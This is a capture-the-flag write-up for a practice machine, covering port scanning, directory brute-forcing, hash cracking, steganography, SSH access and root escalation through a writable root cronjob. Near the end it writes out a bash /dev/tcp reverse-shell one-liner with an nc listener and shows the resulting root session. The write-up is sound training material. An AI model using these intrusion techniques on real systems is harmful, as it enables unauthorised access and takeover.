
Task 1
	1.1 How many ports are open? 
	1.2 What is the version of nginx?
	1.3 What is running on the highest port?

Task 2
	2.1 Using GoBuster, find flag 1.
	2.2 Further enumerate the machine, what is flag 2?
	2.3 Crack the hash with easypeasy.txt, What is the flag 3?  
	2.4 What is the hidden directory?  
	2.5 Using the wordlist that provided to you in this task crack the hash what is the password?
	2.6 What is the password to login to the machine via SSH? 
	2.7 What is the user flag? 
	2.8 What is the root flag?


Let's firstly move to our "CTFs" directory and create a new sub-directory called "easy_peasy" using the following command:
```bash
cd ~/CTFs && mkdir easy_peasy 
```
This will allow us to keep everything related to this Capture The Flag organised and contained within this new directory.


We start the enumeration process by running an nmap scan. 
```bash
nmap -sC -sV -p- <TARGET_IP> -v
```
- `-sC`: This option enables the default set of NSE scripts. Nmap Scripting Engine (NSE) scripts are used for additional information gathering and vulnerability detection.
    
- `-sV`: This option enables version detection. Nmap will try to determine the versions of services running on the target ports.
    
- `-p-`: This option specifies scanning all 65535 ports on the target. The hyphen indicates a port range from 1 to 65535.

```bash
┌──(thelant3rn㉿Kali)-[~/CTFs/easy_peasy]
└─$ nmap -sC -sV -p- 10.10.193.198 -v
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-29 08:29 EDT
Nmap scan report for 10.10.193.198
Host is up (0.056s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
|_http-server-header: nginx/1.16.1
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Welcome to nginx!
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
|_http-server-header: Apache/2.4.43 (Ubuntu)
|_http-title: Apache2 Debian Default Page: It works
| http-robots.txt: 1 disallowed entry 
|_/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The nmap scan reveals the following open ports:
- 80 - http
- 6498 - ssh
- 65524 - http

- 1.1 How many ports are open? **✓**
- 1.2 What is the version of nginx?**✓**
- 1.3 What is running on the highest port?**✓**


Navigating to ``http://10.10.193.198`` leads us to a generic nginx landing page.

![nginx landing page](/assets/images/1.png)

Viewing the page source code doesn't lead us anywhere, there are no clues or hints.
We can check the /robots.txt as discovered by our initial nmap scan.

![[Pasted image 20230829134753.png]]
No luck here either. Let's run a gobuster scan to try to enumerate sub-directories

```bash
gobuster dir -u 10.10.193.198 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .html,.xml,.txt,.php
```
- `dir`: This option specifies that we want to perform directory brute-forcing.
    
- `-u`: This option specifies the target URL or IP address to scan.
    
- `-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`: This option specifies the wordlist file to use for directory brute-forcing.
    
- `-x .html,.xml,.txt,.php`: This option specifies the file extensions to look for during the brute-forcing process. The extensions `.html`, `.xml`, `.txt`, and `.php` are included in this example. Gobuster will attempt to find files with these extensions in the directories it scans.

After a little while we see a ``/hidden`` subdirectory

![[Pasted image 20230829135042.png]]

Navigating to `http://10.10.193.198/hidden` leads us to the following page

![[Pasted image 20230829135213.png]]

Viewing the page source doesn't reveal anything useful

![[Pasted image 20230829135822.png]]

Lets point out gobuster scan towards the `/hidden` subdirectory
````bash
gobuster dir -u 10.10.193.198/hidden -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .html,.xml,.txt,.php
````

Our scan reveals another subdirectory, this one called `/whatever`
![[Pasted image 20230829141305.png]]

Navigating to `http://10.10.193.198/hidden/whatever/` reveals an image.

![[Pasted image 20230829141946.png]]
This seems to be a dead end...Let's take a look at the source code.

![[Pasted image 20230829142050.png]]
Ah! It seems like we've found a base64 encoded string.
We have several options to decode it such as:
https://www.base64decode.org/
https://gchq.github.io/CyberChef/
or via the command line interface using the following command:
````bash
echo "base64_string_to_decode" | base64 -d
````

Today we will be using CyberChef to decode it (as we'll also be using it later on)

![[Pasted image 20230829142920.png]]
After decoding it we get our first flag.
- 2.1 Using GoBuster, find flag 1. **✓**

Looking back at our initial nmap scan we notice that there was an unusual HTTP port open, port 65524. Heading over to `http://10.10.193.198:65524` leads us to an Apache 2 landing page.

![[Pasted image 20230829145845.png]]

Everything seems like a normal Apache 2 landing page but upon closer inspection we see that there's actually a flag in the text.

![[Pasted image 20230829145939.png]]
This is Flag 3.
- 2.3 Crack the hash with easypeasy.txt, What is the flag 3? **✓**
	(This flag was in clear text and cracking the hash wasn't necessary.)

Lets run gobuster to see if we can find any directories.
```bash
gobuster dir -u http://10.10.193.198:65524/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .html,.xml,.txt,.php
```


Gobuster indicates the presence of a ``/robots.txt`` subdirectory, let's check it out

![[Pasted image 20230829151038.png]]
Interesting...the user-agent seems to be some sort of hash. Let's use `hash-identifier`, built into Kali, to try and figure out what  sort of hash we're working with.

![[Pasted image 20230829151724.png]]

Seems to be an MD5 hash.
There are several ways of cracking hashes. We could use an online service like ``https://crackstation.net/``, let's try that first.

![[Pasted image 20230829160000.png]]

No luck. Let's try cracking it locally using hashcat with the wordlist provided in the CTF.

```bash
hashcat –m 0 <REDACTED_HASH> -a 0 /home/thelant3rn/CTFs/easy_peasy/easypeasy.txt
```
 `-m 0`: Specifies the type of hash as MD5.
 `-a 0`: Specifies the attack mode as a straight dictionary attack
 

This didn't work either...hmm...we'll need to dig around a little further. Let's try looking up the hash using a search engine.

![[Pasted image 20230829163238.png]]

Success! We manage to find Flag 2.
- 2.2 Further enumerate the machine, what is flag 2?**✓**


Let's take a step back and have a look at the Apache 2 landing page's source code. There's something interesting on line 194

![[Pasted image 20230829152958.png]]
`its encoded with ba....:REDACTED`

It hints at the string being encoded with ``ba....``, do they mean Base64? Let's head over to CyberChef.

![[Pasted image 20230829153512.png]]

After some trial and error we discover the string is encoded using Base62. The decoded string seems to be a subdirectory. Upon checking we find out that it is indeed the hidden subdirectory.
- 2.4 What is the hidden directory? **✓**

![[Pasted image 20230829154529.png]]

There doesn't seem to be much here at first glance. Let's have a look at the source code.

![[Pasted image 20230829164146.png]]

I noticed two interesting things. We have the first image to be hosted at our target IP `http://10.10.193.198:65524/REDACTED/binarycodepixabay.jpg` . The other images so far have been hosted on `cdn.pixabay.com` . It's worth downloading and inspecting.
The second interesting thing is the string `9******REDACTED********81` . Could this be a hash?

Let's firstly download the .jpg file using:
``wget http://10.10.193.198:65524/REDACTED/binarycodepixabay.jpg``

![[Pasted image 20230829165300.png]]

Now that we've downloaded the image let's have a look at the string. We'll be, once again, using ``hash-identifier``
![[Pasted image 20230829165509.png]]
It's most likely a SHA-256 hash. Let's try cracking it with the previous wordlist (provided by the CTF)

```bash
hashcat -m 1400 -a 0 <REDACTED_HASH> /home/thelant3rn/CTFs/easy_peasy/easypeasy.txt
```
`-m 1400`: Specifies the type of hash as SHA-256.
`-a 0`: Specifies the attack mode as a straight dictionary attack


No luck cracking it using hashcat, let's try John the Ripper instead.

```bash
sudo john --format=GOST hash.txt --wordlist=easypeasy.txt
```

![[Pasted image 20230829173509.png]]
Success!
- 2.5 Using the wordlist that provided to you in this task crack the hash what is the password?**✓**


![[Pasted image 20230829173617.png]]
(Alternatively we could have also used https://md5hashing.net as previously)


Let's go back and take a look at the ``.jpg`` file we downloaded earlier. I'll run `steghide` with the previously discovered password to see if there's anything hidden within the image file using the following command:

```bash
steghide extract -sf binarycodepixabay.jpg
```

![[Pasted image 20230829174300.png]]

It worked! Let's have a look at "secrettext.txt"

![[Pasted image 20230829174433.png]]
We have a username `boring` and a password that seems to be in binary. Let's head over to CyberChef once more.

![[Pasted image 20230829174654.png]]

It worked, now we have a username and password.
- 2.6 What is the password to login to the machine via SSH? **✓**


Let's SSH into the target IP using these credentials. From our initial nmap scan we found out that SSH is running on port 6498 (instead of the standard 22). 

```bash
ssh -p 6498 boring@<TARGET_IP>
```

![[Pasted image 20230829175432.png]]

We're in! Using the `ls` command we see there's a `user.txt` file

```bash
boring@kral4-PC:~$ ls
user.txt

boring@kral4-PC:~$ cat user.txt 
User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{REDACTED}
```

We have a flag but it seems to be using some sort of rotation. Heading over to CyberChef we can try and rotate it back to normal.

![[Pasted image 20230829180153.png]]
It was using ROT13, we now have the user flag.
- 2.7 What is the user flag?**✓**
Time to move onto the root flag.

Let's simply try to `cd /root`, no luck...trying `sudo -l` informs us that the user ``boring`` may not run sudo commands.

```bash
boring@kral4-PC:~$ cd /root
-bash: cd: /root: Permission denied
boring@kral4-PC:~$ sudo -l
[sudo] password for boring: 
Sorry, user boring may not run sudo on kral4-PC.
```

Let's look at the crontabs, it's always a good place to try and find a potential misconfigured cronjob which allows us to escalate our privileges.
Looking at the crontabs we see that there's a bash script called `.mysecretcronjob.sh`

```bash
boring@kral4-PC:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
```

Opening ``.mysecretcronjob.sh`` shows us that the following will run as root
```bash
boring@kral4-PC:/var/www$ cat .mysecretcronjob.sh 
#!/bin/bash
# i will run as root
```

Running `which nano` reveals that nano is installed.
```bash
boring@kral4-PC:/var/www$ which nano
/bin/nano
```
We can use it to edit the bash script and create a reverse shell.


Let's start by creating a netcat listener on our end (attacker's machine)
```bash
┌──(thelant3rn㉿Kali)-[~/CTFs/easy_peasy]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

We add the following reverse shell script:
`bash -i >& /dev/tcp/YOUR_IP_ADDRESS/SAME_PORT_AS_LISTENER 0>&1` into the script, save it, wait for it to run for our listener to receive the incoming connection.
![[Pasted image 20230830114427.png]]

Shortly after we have a reverse shell with root access.

```bash
┌──(thelant3rn㉿Kali)-[~/CTFs/easy_peasy]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.18.4.213] from (UNKNOWN) [10.10.193.198] 47740
bash: cannot set terminal process group (2683): Inappropriate ioctl for device
bash: no job control in this shell
root@kral4-PC:/var/www# whoami
whoami
root
root@kral4-PC:/var/www# cd /root
cd /root
root@kral4-PC:~# ls -la
ls -la
total 40
drwx------  5 root root 4096 Jun 15  2020 .
drwxr-xr-x 23 root root 4096 Jun 15  2020 ..
-rw-------  1 root root    2 Aug 29 10:35 .bash_history
-rw-r--r--  1 root root 3136 Jun 15  2020 .bashrc
drwx------  2 root root 4096 Jun 13  2020 .cache
drwx------  3 root root 4096 Jun 13  2020 .gnupg
drwxr-xr-x  3 root root 4096 Jun 13  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   39 Jun 15  2020 .root.txt
-rw-r--r--  1 root root   66 Jun 14  2020 .selected_editor
root@kral4-PC:~# cat .root.txt  
cat .root.txt
flag{**********REDACTED************}
```

Looking around we find the hidden `.root.txt` flag.
- 2.8 What is the root flag?**✓**

Having found the root flag we have now completed the CTF :)
